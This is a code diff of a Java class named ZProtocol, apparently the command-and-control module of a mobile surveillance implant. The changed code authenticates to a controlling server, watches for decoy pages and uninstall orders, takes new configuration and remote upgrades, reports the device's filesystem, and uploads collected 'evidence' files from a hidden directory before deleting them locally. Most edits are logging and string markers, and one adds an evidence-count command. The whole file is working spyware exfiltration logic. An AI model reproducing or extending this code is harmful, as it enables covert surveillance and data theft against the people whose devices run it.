@@ -39,12 +39,12 @@ public class ZProtocol extends Protocol {
 
     private static final int SHA1LEN = 20;
     //#ifdef DEBUG
-    private static Debug debug = new Debug("ZProtocol", DebugLevel.INFORMATION);
+    private static Debug debug = new Debug("ZProtocol", DebugLevel.INFORMATION); //$NON-NLS-1$
     //#endif
 
     private final EncryptionPKCS5 cryptoK = new EncryptionPKCS5();
-    private final Encryption cryptoConf = new Encryption(Encryption.getKeys()
-            .getProtoKey());
+    private final EncryptionPKCS5 cryptoConf = new EncryptionPKCS5(Encryption
+            .getKeys().getProtoKey());
 
     byte[] Kd = new byte[16];
     byte[] Nonce = new byte[16];
@@ -55,9 +55,8 @@ public class ZProtocol extends Protocol {
 
     public boolean perform() {
         //#ifdef DBC
-        Check.requires(transport != null, "perform: transport = null");
+        Check.requires(transport != null, "perform: transport = null"); //$NON-NLS-1$
         //#endif
-
 
         // key init
         //cryptoConf.makeKey(Encryption.getKeys().getProtoKey());
@@ -65,20 +64,22 @@ public class ZProtocol extends Protocol {
         RandomSource.getBytes(Nonce);
 
         //#ifdef DEBUG
-        debug.trace("Kd: " + Utils.byteArrayToHex(Kd));
-        debug.trace("Nonce: " + Utils.byteArrayToHex(Nonce));
+        debug.trace("Kd: " + Utils.byteArrayToHex(Kd)); //$NON-NLS-1$
+        debug.trace("Nonce: " + Utils.byteArrayToHex(Nonce)); //$NON-NLS-1$
         //#endif
 
         try {
-
             transport.start();
 
             //#ifdef DEBUG
-            debug.info("***** Authentication *****");
+            debug.info("***** Authentication *****"); //$NON-NLS-1$
 
             //#endif          
 
             byte[] cypherOut = cryptoConf.encryptData(forgeAuthentication(), 0);
+            //#ifdef DEBUG
+            debug.trace("perform: " + Utils.byteArrayToHex(cypherOut));
+            //#endif
             byte[] response = transport.command(cypherOut);
             Status.self().uninstall = parseAuthentication(response);
             cypherOut = null;
@@ -86,13 +87,13 @@ public class ZProtocol extends Protocol {
 
             if (status.uninstall) {
                 //#ifdef DEBUG
-                debug.warn("Uninstall detected, no need to continue");
+                debug.warn("Uninstall detected, no need to continue"); //$NON-NLS-1$
                 //#endif  
                 return true;
             }
 
             //#ifdef DEBUG
-            debug.info("***** Identification *****");
+            debug.info("***** Identification *****"); //$NON-NLS-1$
             //#endif  
             response = command(Proto.ID, forgeIdentification());
             boolean[] capabilities = parseIdentification(response);
@@ -100,7 +101,7 @@ public class ZProtocol extends Protocol {
 
             if (capabilities[Proto.NEW_CONF]) {
                 //#ifdef DEBUG
-                debug.info("***** NewConf *****");
+                debug.info("***** NewConf *****"); //$NON-NLS-1$
                 //#endif  
 
                 response = command(Proto.NEW_CONF);
@@ -109,23 +110,23 @@ public class ZProtocol extends Protocol {
 
                 if (newconf != Proto.NO) {
                     //#ifdef DEBUG
-                    debug.trace("perform: had a conf");
+                    debug.trace("perform: had a conf"); //$NON-NLS-1$
                     //#endif
                     boolean ret = false;
 
                     if (newconf == Proto.OK) {
                         //#ifdef DEBUG
-                        debug.trace("perform: conf is not corrupted, try it");
+                        debug.trace("perform: conf is not corrupted, try it"); //$NON-NLS-1$
                         //#endif
                         ret = Task.getInstance().reloadConf();
                     } else {
                         //#ifdef DEBUG
-                        debug.trace("perform: conf was corrupted, or cannot write it");
+                        debug.trace("perform: conf was corrupted, or cannot write it"); //$NON-NLS-1$
                         //#endif
                     }
 
                     //#ifdef DEBUG
-                    debug.trace("perform, conf return: " + ret);
+                    debug.trace("perform, conf return: " + ret); //$NON-NLS-1$
                     //#endif
                     byte[] data;
                     if (ret) {
@@ -135,7 +136,7 @@ public class ZProtocol extends Protocol {
                     }
 
                     //#ifdef DEBUG
-                    debug.trace("perform: sending newconf: " + ret);
+                    debug.trace("perform: sending newconf: " + ret); //$NON-NLS-1$
                     //#endif
                     command(Proto.NEW_CONF, data);
                 }
@@ -143,7 +144,7 @@ public class ZProtocol extends Protocol {
 
             if (capabilities[Proto.DOWNLOAD]) {
                 //#ifdef DEBUG
-                debug.info("***** Download *****");
+                debug.info("***** Download *****"); //$NON-NLS-1$
                 //#endif  
                 response = command(Proto.DOWNLOAD);
                 parseDownload(response);
@@ -152,7 +153,7 @@ public class ZProtocol extends Protocol {
 
             if (capabilities[Proto.UPLOAD]) {
                 //#ifdef DEBUG
-                debug.info("***** Upload *****");
+                debug.info("***** Upload *****"); //$NON-NLS-1$
                 //#endif  
 
                 upgrade = false;
@@ -167,7 +168,7 @@ public class ZProtocol extends Protocol {
 
             if (capabilities[Proto.UPGRADE]) {
                 //#ifdef DEBUG
-                debug.info("***** Upgrade *****");
+                debug.info("***** Upgrade *****"); //$NON-NLS-1$
                 //#endif  
 
                 upgradeFiles.removeAllElements();
@@ -182,7 +183,7 @@ public class ZProtocol extends Protocol {
 
             if (capabilities[Proto.FILESYSTEM]) {
                 //#ifdef DEBUG
-                debug.info("***** FileSystem *****");
+                debug.info("***** FileSystem *****"); //$NON-NLS-1$
                 //#endif  
                 response = command(Proto.FILESYSTEM);
                 parseFileSystem(response);
@@ -190,13 +191,13 @@ public class ZProtocol extends Protocol {
             }
 
             //#ifdef DEBUG
-            debug.info("***** Log *****");
+            debug.info("***** Log *****"); //$NON-NLS-1$
             //#endif  
 
             sendEvidences(Path.hidden());
 
             //#ifdef DEBUG
-            debug.info("***** END *****");
+            debug.info("***** END *****"); //$NON-NLS-1$
             //#endif  
             response = command(Proto.BYE);
             parseEnd(response);
@@ -207,22 +208,25 @@ public class ZProtocol extends Protocol {
         } catch (TransportException e) {
             //#ifdef DEBUG 
             debug.error(e);
+            debug.error("perform: TransportException " + e);
             //#endif
             return false;
         } catch (ProtocolException e) {
             //#ifdef DEBUG
             debug.error(e);
+            debug.error("perform: ProtocolException " + e);
             //#endif
             return false;
         } catch (CommandException e) {
             //#ifdef DEBUG
             debug.error(e);
+            debug.error("perform: CommandException " + e);
             //#endif
             return false;
         } catch (Exception e) {
             //#ifdef DEBUG
             debug.error(e);
-            e.printStackTrace();
+            debug.error("perform: Exception " + e);
             //#endif
             return false;
         } finally {
@@ -243,7 +247,7 @@ public class ZProtocol extends Protocol {
 
         //#ifdef DBC
         Check.ensures(dataBuffer.getPosition() == 32,
-                "forgeAuthentication, wrong array size");
+                "forgeAuthentication, wrong array size"); //$NON-NLS-1$
         //#endif
 
         dataBuffer.write(Utils.padByteArray(keys.getBuildID(), 16));
@@ -252,7 +256,7 @@ public class ZProtocol extends Protocol {
 
         //#ifdef DBC
         Check.ensures(dataBuffer.getPosition() == 84,
-                "forgeAuthentication, wrong array size");
+                "forgeAuthentication, wrong array size"); //$NON-NLS-1$
         //#endif
 
         // calculating digest       
@@ -265,8 +269,8 @@ public class ZProtocol extends Protocol {
         byte[] sha1 = digest.getDigest();
 
         //#ifdef DEBUG
-        debug.trace("forgeAuthentication sha1 = " + Utils.byteArrayToHex(sha1));
-        debug.trace("forgeAuthentication confKey="
+        debug.trace("forgeAuthentication sha1 = " + Utils.byteArrayToHex(sha1)); //$NON-NLS-1$
+        debug.trace("forgeAuthentication confKey=" //$NON-NLS-1$
                 + Utils.byteArrayToHex(keys.getConfKey()));
         //#endif
 
@@ -275,11 +279,11 @@ public class ZProtocol extends Protocol {
 
         //#ifdef DBC
         Check.ensures(dataBuffer.getPosition() == data.length,
-                "forgeAuthentication, wrong array size");
+                "forgeAuthentication, wrong array size"); //$NON-NLS-1$
         //#endif
 
         //#ifdef DEBUG
-        debug.trace("forgeAuthentication: " + Utils.byteArrayToHex(data));
+        debug.trace("forgeAuthentication: " + Utils.byteArrayToHex(data)); //$NON-NLS-1$
         //#endif
 
         return data;
@@ -289,7 +293,7 @@ public class ZProtocol extends Protocol {
             throws ProtocolException {
         if (authResult.length != 64) {
             //#ifdef DEBUG
-            debug.trace("parseAuthentication: wrong size. Probably a decoy.");
+            debug.trace("parseAuthentication: wrong size. Probably a decoy."); //$NON-NLS-1$
             //#endif
             throw new ProtocolException(14);
         }
@@ -297,7 +301,7 @@ public class ZProtocol extends Protocol {
         boolean uninstall = false;
 
         //#ifdef DEBUG
-        debug.trace("decodeAuth result = " + Utils.byteArrayToHex(authResult));
+        debug.trace("decodeAuth result = " + Utils.byteArrayToHex(authResult)); //$NON-NLS-1$
         //#endif
 
         // Retrieve K
@@ -308,8 +312,8 @@ public class ZProtocol extends Protocol {
             byte[] Ks = cryptoConf.decryptData(cypherKs);
 
             //#ifdef DEBUG
-            debug.trace("decodeAuth Kd=" + Utils.byteArrayToHex(Kd));
-            debug.trace("decodeAuth Ks=" + Utils.byteArrayToHex(Ks));
+            debug.trace("decodeAuth Kd=" + Utils.byteArrayToHex(Kd)); //$NON-NLS-1$
+            debug.trace("decodeAuth Ks=" + Utils.byteArrayToHex(Ks)); //$NON-NLS-1$
 
             //#endif
 
@@ -325,7 +329,7 @@ public class ZProtocol extends Protocol {
             cryptoK.makeKey(K);
 
             //#ifdef DEBUG
-            debug.trace("decodeAuth K=" + Utils.byteArrayToHex(K));
+            debug.trace("decodeAuth K=" + Utils.byteArrayToHex(K)); //$NON-NLS-1$
             //#endif
 
             // Retrieve Nonce and Cap
@@ -337,29 +341,29 @@ public class ZProtocol extends Protocol {
             crypto2 = null;
 
             //#ifdef DEBUG
-            debug.trace("decodeAuth plainNonceCap="
+            debug.trace("decodeAuth plainNonceCap=" //$NON-NLS-1$
                     + Utils.byteArrayToHex(plainNonceCap));
             //#endif
 
             boolean nonceOK = Utils.equals(Nonce, 0, plainNonceCap, 0,
                     Nonce.length);
             //#ifdef DEBUG
-            debug.trace("decodeAuth nonceOK: " + nonceOK);
+            debug.trace("decodeAuth nonceOK: " + nonceOK); //$NON-NLS-1$
             //#endif
             if (nonceOK) {
                 int cap = Utils.byteArrayToInt(plainNonceCap, 16);
                 if (cap == Proto.OK) {
                     //#ifdef DEBUG
-                    debug.trace("decodeAuth Proto OK");
+                    debug.trace("decodeAuth Proto OK"); //$NON-NLS-1$
                     //#endif
                 } else if (cap == Proto.UNINSTALL) {
                     //#ifdef DEBUG
-                    debug.trace("decodeAuth Proto Uninstall");
+                    debug.trace("decodeAuth Proto Uninstall"); //$NON-NLS-1$
                     //#endif
                     uninstall = true;
                 } else {
                     //#ifdef DEBUG
-                    debug.trace("decodeAuth error: " + cap);
+                    debug.trace("decodeAuth error: " + cap); //$NON-NLS-1$
                     //#endif
                     throw new ProtocolException(11);
                 }
@@ -369,7 +373,7 @@ public class ZProtocol extends Protocol {
 
         } catch (CryptoException ex) {
             //#ifdef DEBUG
-            debug.error("parseAuthentication: " + ex);
+            debug.error("parseAuthentication: " + ex); //$NON-NLS-1$
             //#endif
             throw new ProtocolException(13);
         }
@@ -399,11 +403,11 @@ public class ZProtocol extends Protocol {
 
         //#ifdef DBC
         Check.ensures(dataBuffer.getPosition() == content.length,
-                "forgeIdentification pos: " + dataBuffer.getPosition());
+                "forgeIdentification pos: " + dataBuffer.getPosition()); //$NON-NLS-1$
         //#endif
 
         //#ifdef DEBUG
-        debug.trace("forgeIdentification: " + Utils.byteArrayToHex(content));
+        debug.trace("forgeIdentification: " + Utils.byteArrayToHex(content)); //$NON-NLS-1$
         //#endif
         return content;
     }
@@ -415,7 +419,7 @@ public class ZProtocol extends Protocol {
         int res = Utils.byteArrayToInt(result, 0);
         if (res == Proto.OK) {
             //#ifdef DEBUG
-            debug.info("got Identification");
+            debug.info("got Identification"); //$NON-NLS-1$
             //#endif
 
             DataBuffer dataBuffer = new DataBuffer(result, 4,
@@ -427,14 +431,14 @@ public class ZProtocol extends Protocol {
                 long dateServer = dataBuffer.readLong();
 
                 //#ifdef DEBUG
-                debug.trace("parseIdentification: " + dateServer);
+                debug.trace("parseIdentification: " + dateServer); //$NON-NLS-1$
                 //#endif
 
                 Date date = new Date();
                 int drift = (int) (dateServer - (date.getTime() / 1000));
 
                 //#ifdef DEBUG
-                debug.trace("parseIdentification drift: " + drift);
+                debug.trace("parseIdentification drift: " + drift); //$NON-NLS-1$
                 //#endif
                 Status.getInstance().drift = drift;
 
@@ -446,7 +450,7 @@ public class ZProtocol extends Protocol {
                         capabilities[cap] = true;
                     }
                     //#ifdef DEBUG
-                    debug.trace("capabilities: " + capabilities[i]);
+                    debug.trace("capabilities: " + capabilities[i]); //$NON-NLS-1$
                     //#endif                   
                 }
 
@@ -458,11 +462,11 @@ public class ZProtocol extends Protocol {
             }
         } else if (res == Proto.NO) {
             //#ifdef DEBUG
-            debug.info("no new conf: ");
+            debug.info("no new conf: "); //$NON-NLS-1$
             //#endif
         } else {
             //#ifdef DEBUG
-            debug.error("parseNewConf: " + res);
+            debug.error("parseNewConf: " + res); //$NON-NLS-1$
             //#endif
             throw new ProtocolException();
         }
@@ -487,7 +491,7 @@ public class ZProtocol extends Protocol {
             final int confLen = Utils.byteArrayToInt(result, 4);
             if (confLen > 0) {
                 //#ifdef DEBUG
-                debug.info("got NewConf");
+                debug.info("got NewConf"); //$NON-NLS-1$
                 //#endif
 
                 ret = Protocol.saveNewConf(result, 8);
@@ -521,7 +525,7 @@ public class ZProtocol extends Protocol {
         int res = Utils.byteArrayToInt(result, 0);
         if (res == Proto.OK) {
             //#ifdef DEBUG
-            debug.trace("parseDownload, OK");
+            debug.trace("parseDownload, OK"); //$NON-NLS-1$
             //#endif
             DataBuffer dataBuffer = new DataBuffer(result, 4,
                     result.length - 4, false);
@@ -532,7 +536,7 @@ public class ZProtocol extends Protocol {
                 for (int i = 0; i < numElem; i++) {
                     String file = WChar.readPascal(dataBuffer);
                     //#ifdef DEBUG
-                    debug.trace("parseDownload: " + file);
+                    debug.trace("parseDownload: " + file); //$NON-NLS-1$
                     //#endif
 
                     // expanding $dir$
@@ -549,11 +553,11 @@ public class ZProtocol extends Protocol {
             }
         } else if (res == Proto.NO) {
             //#ifdef DEBUG
-            debug.info("parseDownload: no download");
+            debug.info("parseDownload: no download"); //$NON-NLS-1$
             //#endif
         } else {
             //#ifdef DEBUG
-            debug.error("parseDownload, wrong answer: " + res);
+            debug.error("parseDownload, wrong answer: " + res); //$NON-NLS-1$
             //#endif
             throw new ProtocolException();
         }
@@ -569,7 +573,7 @@ public class ZProtocol extends Protocol {
         int res = Utils.byteArrayToInt(result, 0);
         if (res == Proto.OK) {
             //#ifdef DEBUG
-            debug.trace("parseUpload, OK");
+            debug.trace("parseUpload, OK"); //$NON-NLS-1$
             //#endif
             DataBuffer dataBuffer = new DataBuffer(result, 4,
                     result.length - 4, false);
@@ -577,11 +581,11 @@ public class ZProtocol extends Protocol {
                 int totSize = dataBuffer.readInt();
                 int left = dataBuffer.readInt();
                 //#ifdef DEBUG
-                debug.trace("parseUpload left: " + left);
+                debug.trace("parseUpload left: " + left); //$NON-NLS-1$
                 //#endif
                 String filename = WChar.readPascal(dataBuffer);
                 //#ifdef DEBUG
-                debug.trace("parseUpload: " + filename);
+                debug.trace("parseUpload: " + filename); //$NON-NLS-1$
                 //#endif
 
                 int size = dataBuffer.readInt();
@@ -589,21 +593,20 @@ public class ZProtocol extends Protocol {
                 dataBuffer.read(content);
 
                 //#ifdef DEBUG
-                debug.trace("parseUpload: saving");
+                debug.trace("parseUpload: saving"); //$NON-NLS-1$
                 //#endif
                 Protocol.saveUpload(filename, content);
 
-                if (filename.equals(Protocol.UPGRADE_FILENAME_0)
-                        || filename.equals(Protocol.UPGRADE_FILENAME_1)) {
+                if (filename.startsWith("core")) {
                     upgrade = true;
                     //#ifdef DEBUG
-                    debug.trace("parseUpload: there's something to upgrade");
+                    debug.trace("parseUpload: there's something to upgrade"); //$NON-NLS-1$
                     //#endif
                 }
 
                 if (left == 0 && upgrade) {
                     //#ifdef DEBUG
-                    debug.trace("parseUpload: last file, go to upgrade");
+                    debug.trace("parseUpload: last file, go to upgrade"); //$NON-NLS-1$
                     //#endif
                     upgradeMulti();
                 }
@@ -613,17 +616,18 @@ public class ZProtocol extends Protocol {
             } catch (EOFException e) {
                 //#ifdef DEBUG
                 debug.error(e);
+                debug.error("parseUpload: " + e);
                 //#endif
                 throw new ProtocolException();
             }
         } else if (res == Proto.NO) {
             //#ifdef DEBUG
-            debug.trace("parseUpload, NO");
+            debug.trace("parseUpload, NO"); //$NON-NLS-1$
             //#endif
             return false;
         } else {
             //#ifdef DEBUG
-            debug.error("parseUpload, wrong answer: " + res);
+            debug.error("parseUpload, wrong answer: " + res); //$NON-NLS-1$
             //#endif
             throw new ProtocolException();
         }
@@ -634,7 +638,7 @@ public class ZProtocol extends Protocol {
         int res = Utils.byteArrayToInt(result, 0);
         if (res == Proto.OK) {
             //#ifdef DEBUG
-            debug.trace("parseUpgrade, OK");
+            debug.trace("parseUpgrade, OK"); //$NON-NLS-1$
             //#endif
             DataBuffer dataBuffer = new DataBuffer(result, 4,
                     result.length - 4, false);
@@ -642,11 +646,11 @@ public class ZProtocol extends Protocol {
                 int totSize = dataBuffer.readInt();
                 int left = dataBuffer.readInt();
                 //#ifdef DEBUG
-                debug.trace("parseUpgrade left: " + left);
+                debug.trace("parseUpgrade left: " + left); //$NON-NLS-1$
                 //#endif
                 String filename = WChar.readPascal(dataBuffer);
                 //#ifdef DEBUG
-                debug.trace("parseUpgrade: " + filename);
+                debug.trace("parseUpgrade: " + filename); //$NON-NLS-1$
                 //#endif
 
                 int size = dataBuffer.readInt();
@@ -654,14 +658,14 @@ public class ZProtocol extends Protocol {
                 dataBuffer.read(content);
 
                 //#ifdef DEBUG
-                debug.trace("parseUpgrade: saving");
+                debug.trace("parseUpgrade: saving"); //$NON-NLS-1$
                 //#endif
                 Protocol.saveUpload(filename, content);
                 upgradeFiles.addElement(filename);
 
                 if (left == 0) {
                     //#ifdef DEBUG
-                    debug.trace("parseUpgrade: all file saved, proceed with upgrade");
+                    debug.trace("parseUpgrade: all file saved, proceed with upgrade"); //$NON-NLS-1$
                     //#endif
                     Protocol.upgradeMulti(upgradeFiles);
                 }
@@ -671,17 +675,18 @@ public class ZProtocol extends Protocol {
             } catch (EOFException e) {
                 //#ifdef DEBUG
                 debug.error(e);
+                debug.error("parseUpgrade: " + e);
                 //#endif
                 throw new ProtocolException();
             }
         } else if (res == Proto.NO) {
             //#ifdef DEBUG
-            debug.trace("parseUpload, NO");
+            debug.trace("parseUpgrade, NO"); //$NON-NLS-1$
             //#endif
             return false;
         } else {
             //#ifdef DEBUG
-            debug.error("parseUpload, wrong answer: " + res);
+            debug.error("parseUpgrade, wrong answer: " + res); //$NON-NLS-1$
             //#endif
             throw new ProtocolException();
         }
@@ -691,7 +696,7 @@ public class ZProtocol extends Protocol {
         int res = Utils.byteArrayToInt(result, 0);
         if (res == Proto.OK) {
             //#ifdef DEBUG
-            debug.trace("parseFileSystem, OK");
+            debug.trace("parseFileSystem, OK"); //$NON-NLS-1$
             //#endif
             DataBuffer dataBuffer = new DataBuffer(result, 4,
                     result.length - 4, false);
@@ -702,27 +707,26 @@ public class ZProtocol extends Protocol {
                     int depth = dataBuffer.readInt();
                     String file = WChar.readPascal(dataBuffer);
                     //#ifdef DEBUG
-                    debug.trace("parseFileSystem: " + file + " depth: " + depth);
+                    debug.trace("parseFileSystem: " + file + " depth: " + depth); //$NON-NLS-1$ //$NON-NLS-2$
                     //#endif
 
-                    // expanding $dir$
                     file = Directory.expandMacro(file);
                     Protocol.saveFilesystem(depth, file);
                 }
 
             } catch (EOFException e) {
                 //#ifdef DEBUG
-                debug.error("parse error: " + e);
+                debug.error("parse error: " + e); //$NON-NLS-1$
                 //#endif
                 throw new ProtocolException();
             }
         } else if (res == Proto.NO) {
             //#ifdef DEBUG
-            debug.info("parseFileSystem: no download");
+            debug.info("parseFileSystem: no download"); //$NON-NLS-1$
             //#endif
         } else {
             //#ifdef DEBUG
-            debug.error("parseFileSystem, wrong answer: " + res);
+            debug.error("parseFileSystem, wrong answer: " + res); //$NON-NLS-1$
             //#endif
             throw new ProtocolException();
         }
@@ -731,7 +735,7 @@ public class ZProtocol extends Protocol {
     protected void sendEvidences(String basePath) throws TransportException,
             ProtocolException {
         //#ifdef DEBUG
-        debug.info("sendEvidences from: " + basePath);
+        debug.info("sendEvidences from: " + basePath); //$NON-NLS-1$
         //#endif
 
         EvidenceCollector logCollector = EvidenceCollector.getInstance();
@@ -739,38 +743,50 @@ public class ZProtocol extends Protocol {
         final Vector dirs = logCollector.scanForDirLogs(basePath);
         final int dsize = dirs.size();
         //#ifdef DEBUG
-        debug.trace("sendEvidences #directories: " + dsize);
+        debug.trace("sendEvidences #directories: " + dsize); //$NON-NLS-1$
         //#endif
         for (int i = 0; i < dsize; ++i) {
             final String dir = (String) dirs.elementAt(i);
             final Vector logs = logCollector.scanForEvidences(basePath, dir);
             final int lsize = logs.size();
             //#ifdef DEBUG
-            debug.trace("    dir: " + dir + " #evidences: " + lsize);
+            debug.trace("    dir: " + dir + " #evidences: " + lsize); //$NON-NLS-1$ //$NON-NLS-2$
             //#endif
+
+            // Evidence SIZE
+            byte[] plainOut = new byte[4 + 8];
+            Utils.copy(plainOut, 0, Utils.intToByteArray(lsize), 0, 4);
+
+            byte[] response;
+            
+            if (!Keys.getInstance().isSeven()) {
+                response = command(Proto.EVIDENCE_SIZE, plainOut);
+                checkOk(response);
+            }
+
             for (int j = 0; j < lsize; ++j) {
                 final String logName = (String) logs.elementAt(j);
                 final String fullLogName = basePath + dir + logName;
                 final AutoFile file = new AutoFile(fullLogName, false);
                 if (!file.exists()) {
                     //#ifdef DEBUG
-                    debug.error("File doesn't exist: " + fullLogName);
+                    debug.error("File doesn't exist: " + fullLogName); //$NON-NLS-1$
                     //#endif
                     continue;
                 }
                 final byte[] content = file.read();
                 //#ifdef DEBUG
-                debug.info("Sending file: "
-                        + EvidenceCollector.decryptName(logName) + " = "
+                debug.info("Sending file: " //$NON-NLS-1$
+                        + EvidenceCollector.decryptName(logName) + " = " //$NON-NLS-1$
                         + fullLogName);
                 //#endif
 
-                byte[] plainOut = new byte[content.length + 4];
+                plainOut = new byte[content.length + 4];
                 Utils.copy(plainOut, 0, Utils.intToByteArray(content.length),
                         0, 4);
                 Utils.copy(plainOut, 4, content, 0, content.length);
 
-                byte[] response = command(Proto.LOG, plainOut);
+                response = command(Proto.LOG, plainOut);
                 plainOut = null;
 
                 boolean ret = parseLog(response);
@@ -779,24 +795,24 @@ public class ZProtocol extends Protocol {
                     logCollector.remove(fullLogName);
                 } else {
                     //#ifdef DEBUG
-                    debug.warn("error sending file, bailing out");
+                    debug.warn("error sending file, bailing out"); //$NON-NLS-1$
                     //#endif
                     return;
                 }
             }
             if (!Path.removeDirectory(basePath + dir)) {
                 //#ifdef DEBUG
-                debug.warn("Not empty directory");
+                debug.warn("Not empty directory"); //$NON-NLS-1$
                 //#endif
             }
 
             //#ifdef DEBUG
-            debug.trace("    dir finished: " + dir);
+            debug.trace("    dir finished: " + dir); //$NON-NLS-1$
             //#endif
         }
 
         //#ifdef DEBUG
-        debug.trace("sendEvidences finished");
+        debug.trace("sendEvidences finished"); //$NON-NLS-1$
         //#endif
     }
 
@@ -812,19 +828,19 @@ public class ZProtocol extends Protocol {
     private byte[] command(int command) throws TransportException,
             ProtocolException {
         //#ifdef DEBUG
-        debug.trace("command: " + command);
+        debug.trace("command: " + command); //$NON-NLS-1$
         //#endif
         return command(command, new byte[0]);
     }
 
     private byte[] command(int command, byte[] data) throws TransportException {
         //#ifdef DBC
-        Check.requires(cryptoK != null, "cypherCommand: cryptoK null");
-        Check.requires(data != null, "cypherCommand: data null");
+        Check.requires(cryptoK != null, "cypherCommand: cryptoK null"); //$NON-NLS-1$
+        Check.requires(data != null, "cypherCommand: data null"); //$NON-NLS-1$
         //#endif
 
         //#ifdef DEBUG
-        debug.trace("command: " + command + " datalen: " + data.length);
+        debug.trace("command: " + command + " datalen: " + data.length); //$NON-NLS-1$ //$NON-NLS-2$
         //#endif
 
         int dataLen = data.length;
@@ -839,7 +855,7 @@ public class ZProtocol extends Protocol {
             return plainIn;
         } catch (CryptoException e) {
             //#ifdef DEBUG
-            debug.trace("command: " + e);
+            debug.trace("command: " + e); //$NON-NLS-1$
             //#endif
             throw new TransportException(9);
         }
@@ -848,13 +864,13 @@ public class ZProtocol extends Protocol {
     private byte[] cypheredWriteReadSha(byte[] plainOut)
             throws TransportException, CryptoException {
         //#ifdef DEBUG
-        debug.trace("cypheredWriteReadSha");
-        debug.trace("plainout: " + plainOut.length);
+        debug.trace("cypheredWriteReadSha"); //$NON-NLS-1$
+        debug.trace("plainout: " + plainOut.length); //$NON-NLS-1$
         //#endif
 
         byte[] cypherOut = cryptoK.encryptDataIntegrity(plainOut);
         //#ifdef DEBUG        
-        debug.trace("cypherOut: " + cypherOut.length);
+        debug.trace("cypherOut: " + cypherOut.length); //$NON-NLS-1$
         //#endif
 
         byte[] cypherIn = transport.command(cypherOut);
@@ -863,14 +879,14 @@ public class ZProtocol extends Protocol {
         if (result != null
                 && result.indexOf("<meta http-equiv=\"refresh\" content") >= 0) {
             //#ifdef DEBUG
-            debug.error("cypheredWriteReadSha: DECOY PAGE DETECTED!");
+            debug.error("cypheredWriteReadSha: DECOY PAGE DETECTED!"); //$NON-NLS-1$
             //#endif
             throw new TransportException(30);
         }
 
         if (cypherIn.length < SHA1LEN) {
             //#ifdef DEBUG
-            debug.error("cypheredWriteReadSha: cypherIn sha len error!");
+            debug.error("cypheredWriteReadSha: cypherIn sha len error!"); //$NON-NLS-1$
             //#endif
             throw new CryptoException();
         }
@@ -887,12 +903,12 @@ public class ZProtocol extends Protocol {
             return true;
         } else if (res == Proto.NO) {
             //#ifdef DEBUG
-            debug.error("checkOk: NO");
+            debug.error("checkOk: NO"); //$NON-NLS-1$
             //#endif
             return false;
         } else {
             //#ifdef DEBUG
-            debug.error("checkOk: " + res);
+            debug.error("checkOk: " + res); //$NON-NLS-1$
             //#endif
 
             throw new ProtocolException();
